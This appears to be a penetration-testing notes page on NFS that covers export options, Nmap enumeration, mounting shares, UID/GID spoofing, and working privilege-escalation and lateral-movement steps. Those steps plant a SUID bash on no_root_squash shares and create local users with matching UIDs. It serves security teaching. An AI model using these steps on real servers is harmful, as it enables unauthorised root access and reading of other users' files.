---
title: NFS
description: Network File System
categories: [Services]
tags: [Services, NFS]
weight: 2
---

## Service Info
- Name: Network File System (NFS)
- Purpose: Network Drive
- Listening ports: **2049 TCP/UDP** (NFS; NFSv4 normally uses TCP), **111 TCP/UDP** (rpcbind for older versions); NFSv2/v3 may need additional mountd/locking ports.
- OS: Unix-Like

**Network File System (NFS)** was developed by Sun Microsystems in 1984, allowing access to network files much like local storage. It uses **Open Network Computing Remote Procedure Call (ONC-RPC/SUN-RPC)**; port 111 belongs to rpcbind, not all RPC services.

NFS versions:
- NFSv2: Specified in RFC 1094 (March 1989); commonly uses UDP, but TCP implementations also exist.
- NFSv3: Specified in RFC 1813 (June 1995); supports TCP/UDP, 64-bit file sizes/offsets, and improved error reporting. Clients and servers must negotiate a supported version.
- NFSv4: Initially specified in December 2000; normally uses TCP port 2049 without a separate mount protocol. Adds stateful operations, ACLs, and support for stronger authentication; Kerberos is not automatically enabled.

NFS uses RPC authentication flavors. With **AUTH_SYS** (`sec=sys`), the server trusts client-supplied numeric UID/GID values and group memberships; matching usernames are not required. For example, client user `bob` with UID 1000 may receive the file access of server user `alice` with UID 1000, subject to export options and permissions. Use this mode only with trusted clients and appropriate network controls.

NFSv4 adds **stateful** operations and **Access Control Lists (ACLs)**, but may still use `sec=sys`. Kerberos via RPCSEC_GSS (`sec=krb5`, `krb5i`, or `krb5p`) must be configured and required on the export; Linux also supports these flavors with NFSv3. `krb5i` adds integrity and `krb5p` adds privacy.

## NFS Server Configuration
The `/etc/exports` file contains a table of filesystem paths accessible by clients. The default contains comments with example configurations.
```txt
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
```

Configuration options:
- **rw**: Read and write permissions.
- **ro**: Read-only permissions.
- **sync**: Replies to requests only after changes are committed to stable storage.
- **async**: May reply before changes reach stable storage; a crash can cause data loss/corruption.
- **secure**: Requires a client source port below 1024 for non-GSS requests (default).
- **insecure**: Allows nonprivileged client source ports too.
- **no_subtree_check**: This option disables the checking of subdirectory trees.
- **root_squash**: Maps requests with UID/GID 0 to the anonymous UID/GID; does not change stored file ownership or deny all access by client root.
- **nohide (DANGEROUS)**: Exposes nested mounts, which can unintentionally leak sensitive FS segments.
- **no_root_squash (DANGEROUS)**: Disables root squashing, so requests with UID/GID 0 are not mapped to the anonymous IDs.

## Footprinting
Nmap scan with default scripts runs `rpcinfo` when rpcbind is found, which retrieves a list of running RPC services, their names and descriptions, as well as the ports they're using.
```shell-session
$ sudo nmap 10.129.14.128 -p111,2049 -sV -sC

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 17:12 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00018s latency).

PORT    STATE SERVICE VERSION
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      41982/udp6  mountd
|   100005  1,2,3      45837/tcp   mountd
|   100005  1,2,3      47217/tcp6  mountd
|   100005  1,2,3      58830/udp   mountd
|   100021  1,3,4      39542/udp   nlockmgr
|   100021  1,3,4      44629/tcp   nlockmgr
|   100021  1,3,4      45273/tcp6  nlockmgr
|   100021  1,3,4      47524/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp open  nfs_acl 3 (RPC #100227)
MAC Address: 00:00:00:00:00:00 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.58 seconds
```

Nmap also includes scripts written to enumerate NFS.
- `nfs-ls` lists the contents of the share
- `nfs-showmount` lists available shares and which clients are allowed to connect
- `nfs-statfs` shows the stats on each share
```shell-session
$ sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 17:37 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00021s latency).

PORT     STATE SERVICE VERSION
111/tcp  open  rpcbind 2-4 (RPC #100000)
| nfs-ls: Volume /mnt/nfs
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID    GID    SIZE  TIME                 FILENAME
| rwxrwxrwx   65534  65534  4096  2021-09-19T15:28:17  .
| ??????????  ?      ?      ?     ?                    ..
| rw-r--r--   0      0      1872  2021-09-19T15:27:42  id_rsa
| rw-r--r--   0      0      348   2021-09-19T15:28:17  id_rsa.pub
| rw-r--r--   0      0      0     2021-09-19T15:22:30  nfs.share
|_
| nfs-showmount:
|_  /mnt/nfs 10.129.14.0/24
| nfs-statfs:
|   Filesystem  1K-blocks   Used       Available   Use%  Maxfilesize  Maxlink
|_  /mnt/nfs    30313412.0  8074868.0  20675664.0  29%   16.0T        32000
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      41982/udp6  mountd
|   100005  1,2,3      45837/tcp   mountd
|   100005  1,2,3      47217/tcp6  mountd
|   100005  1,2,3      58830/udp   mountd
|   100021  1,3,4      39542/udp   nlockmgr
|   100021  1,3,4      44629/tcp   nlockmgr
|   100021  1,3,4      45273/tcp6  nlockmgr
|   100021  1,3,4      47524/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp open  nfs_acl 3 (RPC #100227)
MAC Address: 00:00:00:00:00:00 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
```

## Mounting NFS
We can create a mount on our local filesystem for an NFS share. The protocol abstractions allow us to work on it as if it's part of our filesystem structure. First, we use `showmount` to enumerate available mounts on the server.
{{% alert title="Note" %}}`showmount` relies on the `mountd` RPC call. In modern hardened NFS servers, this is often disabled. If you see nothing returned as a result of the following command, it does not *necessarily* mean there are no shares available. {{% /alert %}}
```shell-session
$ showmount -e 10.129.14.128

Export list for 10.129.14.128:
/mnt/nfs 10.129.14.0/24
```
Then, create a mount point and mount an exported path. The captured `:/` example uses an NFSv4 pseudo-root; it is not a generic way to mount every export. For the NFSv3 export above, use `sudo mount -t nfs -o vers=3 10.129.14.128:/mnt/nfs ./target-NFS/`. `nolock` disables NLM locking for older versions and is not normally needed.
```shell-session
$ mkdir target-NFS
$ sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
$ cd target-NFS
$ tree .

.
└── mnt
    └── nfs
        ├── id_rsa
        ├── id_rsa.pub
        └── nfs.share

2 directories, 3 files
```
When done, leave the mount directory (`cd ..` in the captured example), then unmount it from its parent directory.
```bash
sudo umount ./target-NFS
```

## NFS UID/GID Spoofing
With `sec=sys`, NFS servers trust client-supplied UID/GID values. A user controlling a permitted client may impersonate other numeric IDs, subject to export restrictions, squashing, and filesystem permissions.
- `all_squash`: Maps all client UIDs/GIDs to the configured anonymous UID/GID (normally 65534, often named `nobody`).
    ```shell-session
    $ whoami
    user
    $ touch nfs_share/user.txt
    $ ls -l nfs_share
    -rw-r--r-- 1 nobody nobody   0 Dec  5 16:46 user.txt
    ```
- `root_squash`: Maps requests with UID/GID 0 to the configured anonymous UID/GID. This is the default on Linux.
    ```shell-session
    $ whoami
    root
    $ touch nfs_share/root.txt
    $ ls -l nfs_share
    -rw-r--r-- 1 nobody nobody   0 Dec  5 16:46 root.txt
    ```
- `no_root_squash`: Disables root squashing; `all_squash`, if configured, still maps all IDs to anonymous IDs.
    ```shell-session
    $ whoami
    root
    $ touch nfs_share/root.txt
    $ ls -l nfs_share
    -rw-r--r-- 1 root root   0 Dec  5 16:46 root.txt
    ```
{{% alert title="Note" %}}
Requiring Kerberos on an export authenticates principals rather than trusting client-supplied AUTH_SYS IDs. Do not also permit `sec=sys` on that export if the goal is to prevent this form of UID/GID spoofing; correct principal-to-local-user mapping is still required.
{{% /alert %}}

### Privilege Escalation
With a writable `sec=sys,no_root_squash` export and control of an allowed client as root, a root-owned setuid Bash may provide root on the target. The target filesystem must honor setuid execution (not `nosuid`/`noexec`), the binary must be compatible, and the user must be able to execute it. Bash `-p` preserves the effective UID set by the kernel; it does not itself grant privileges.

To conduct this attack, we mount the share as root, then create a root-owned copy of bash inside the share with SUID set. Finally, we get a root Bash shell when we execute the root-owned SUID copy on the target, subject to the conditions above.
```bash
# On attacker machine as root
mkdir /mnt/nfs
mount -t nfs <target>:<share> /mnt/nfs
cp /bin/bash /mnt/nfs/bash
chmod 4755 /mnt/nfs/bash
```
```bash
# On target machine
./bash -p
```
{{% alert title="Note" %}} If the OS of your machine differs from the server's, there might be a chance the copy of `/bin/bash` from your machine won't run on the server due to different library versions. When this occurs, we can instead copy `/bin/bash` from inside the server to the share directory, then `chown` it as root from our local machine. After changing ownership, set mode `4755` again, since changing ownership can clear the setuid bit.
{{% /alert %}}

### Lateral Movement
With `sec=sys` and only `root_squash`, non-root IDs are not squashed. Impersonating a non-root UID may grant that user's file access, subject to permissions and other export restrictions. Creating a matching local user is one way to send that UID.

First we get the UID of the target user on the server.
```shell-session
user@target$ id victim
uid=1111(victim) gid=1111(victim) groups=1111(victim)
```

Next, we create a user on our local machine with the same UID. The `useradd` utility has a `-u` option for us to specify a custom UID. Then we use `sudo` to run a bash shell as that user on our local machine.
```bash
# On Local Machine as a sudo user
sudo useradd -u 1111 victim_local
sudo -u victim_local bash
```
Mount the share with administrative privileges, then create the file as the matching UID. If setuid execution is honored on the target, this yields the non-root file owner's effective UID, not root.
```bash
# On attacker machine as root, before switching to victim_local
sudo mkdir -p /mnt/nfs
sudo mount -t nfs <target>:<share> /mnt/nfs
# Copy as the matching non-root UID; the destination must be writable
sudo -u victim_local cp /bin/bash /mnt/nfs/bash
sudo -u victim_local chmod 4755 /mnt/nfs/bash
```
```bash
# On target machine
./bash -p
```

## References
- [Hacktricks - NFS No Root Squash Misconfiguration Privilege Escalation](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe.html#nfs-no-root-squash-misconfiguration-privilege-escalation)
- [Wikipedia - Network File System](https://en.wikipedia.org/wiki/Network_File_System)
